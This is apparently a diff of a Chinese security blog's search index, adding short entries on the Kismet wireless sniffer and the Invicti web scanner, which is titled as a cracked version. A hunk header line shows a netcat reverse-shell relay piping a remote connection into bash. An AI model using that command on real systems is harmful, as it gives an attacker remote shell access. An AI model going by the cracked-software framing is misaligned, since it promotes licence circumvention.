@@ -42,6 +42,56 @@
       </tags>
   </entry>
   <entry>
+    <title>Kismet使用教程</title>
+    <url>/2023/05/24/python/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Kismet"><a href="#Kismet" class="headerlink" title="Kismet"></a>Kismet</h1><p>Kismet是列表中最流行的工具之一。它是一个开源的解决方案，可以作为802.11无线局域网的网络检测器、数据包嗅探器和入侵检测系统。任何支持原始监控模式并能够嗅探802.11a、802.11b、802.11g和802.11n流量的无线卡都将与Kismet兼容。Linux、FreeBSD、NetBSD、 OpenBSD和Mac OS X都支持该程序。客户端也可以在Windows上运行。</p>
+<p>主要特点：</p>
+<ul>
+<li><p>可以在不同类型的操作系统上使用；</p>
+</li>
+<li><p>支持原始监控模式；</p>
+</li>
+<li><p>借助数据流量，它可以被动地识别网络，收集数据包，并发现非信标和隐藏的网络；</p>
+</li>
+</ul>
+<p>如果要进行无线网络渗透测试，则必须先扫描所有有效的无线接入点。刚好在Kali Linux中，提供了一款嗅探无线网络工具Kismet。使用该工具可以测量周围的无线信号，并查看所有可用的无线接入点。本节将介绍使用Kismet工具嗅探无线网络。</p>
+<p>（1）启动Kismet工具。执行命令如下所示：</p>
+<pre class=" language-shell"><code class="language-shell">root@kali:~# kismet
+</code></pre>
+<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686194588/00419_h0y6gx.jpg"></p>
+<p>(2) 扫描的无线信息</p>
+<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686194817/00427_szu0s1.jpg"></p>
+<p>很老的软件，kali linux 自带，简单搜索用一下，有很多替代的新功能软件。</p>
+]]></content>
+      <categories>
+        <category>黑客工具</category>
+      </categories>
+      <tags>
+        <tag>Kismet</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Invicti v22.11.0破解版（原Netsparker)</title>
+    <url>/2023/04/21/invicti-shi-yong-jiao-cheng/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Invicti"><a href="#Invicti" class="headerlink" title="Invicti"></a>Invicti</h3><p>Invicti，之前名为Netsparker，是一个基于web的应用程序安全扫描黑客工具，能够发现SQL注入、XSS、web应用程序中的漏洞。</p>
+<p>主要特点：</p>
+<ul>
+<li>它需要最小的配置；</li>
+<li>它可以在24小时内扫描1000多个网络应用程序；</li>
+<li>自动检测URL重写规则和自定义404错误页面；</li>
+<li>在特殊的基于证明的扫描技术的帮助下，它能以惊人的准确性发现漏洞；</li>
+</ul>
+<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686187562/4a471668222737_iapjh5.png"></p>
+<p>大型企业一般都用，所以在做大型任务时候，必备神器！</p>
+]]></content>
+      <categories>
+        <category>黑客工具</category>
+      </categories>
+      <tags>
+        <tag>invicti</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Burp Suite使用技巧</title>
     <url>/2023/04/21/burp-suite-shi-yong-jiao-cheng/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h1><p>Burp Suite是任何道德黑客武器库的重要组成部分。作为评估网站安全性的可靠工具，它是一个代理工具，能够拦截用户浏览器和目标网站之间的请求和响应，还提供了对网站功能的可见性。这使得道德黑客有能力改变这些请求，利用网站上的安全漏洞或访问受限制的部分。</p>
@@ -120,27 +170,6 @@
       </categories>
       <tags>
         <tag>Burp Suite</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Invicti v22.11.0破解版（原Netsparker)</title>
-    <url>/2023/04/21/invicti-shi-yong-jiao-cheng/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Invicti"><a href="#Invicti" class="headerlink" title="Invicti"></a>Invicti</h3><p>Invicti，之前名为Netsparker，是一个基于web的应用程序安全扫描黑客工具，能够发现SQL注入、XSS、web应用程序中的漏洞。</p>
-<p>主要特点：</p>
-<ul>
-<li>它需要最小的配置；</li>
-<li>它可以在24小时内扫描1000多个网络应用程序；</li>
-<li>自动检测URL重写规则和自定义404错误页面；</li>
-<li>在特殊的基于证明的扫描技术的帮助下，它能以惊人的准确性发现漏洞；</li>
-</ul>
-<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686187562/4a471668222737_iapjh5.png"></p>
-<p>大型企业一般都用，所以在做大型任务时候，必备神器！</p>
-]]></content>
-      <categories>
-        <category>黑客工具</category>
-      </categories>
-      <tags>
-        <tag>invicti</tag>
       </tags>
   </entry>
   <entry>
@@ -278,23 +307,6 @@ kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445
       </categories>
       <tags>
         <tag>AWVS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python</title>
-    <url>/2022/08/12/python/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Python（英國發音：&#x2F;ˈpaɪθən&#x2F; 美國發音：&#x2F;ˈpaɪθɑːn&#x2F;），是一种广泛使用的解释型、高级和通用的编程语言。 </p>
-<p>Python支持多种编程范型，包括函数式、指令式、反射式、结构化和面向对象编程。 </p>
-<p>它拥有动态类型系统和垃圾回收功能，能够自动管理内存使用，并且其本身拥有一个巨大而广泛的标准库。</p>
-<div class="video-container"><iframe   src=https://www.youtube.com/embed/Mgbwi6Sii7g?rel=0&amp;showinfo=0 frameborder=0 gesture=media allow=encrypted-media allowfullscreen></iframe></div>
-
-<div class="video-container"><iframe   src=https://www.youtube.com/embed/rXwJwubqVmI title=YouTube video player frameborder=0 allow=accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share allowfullscreen></iframe></div>
-]]></content>
-      <categories>
-        <category>编程</category>
-      </categories>
-      <tags>
-        <tag>编程语言</tag>
       </tags>
   </entry>
   <entry>
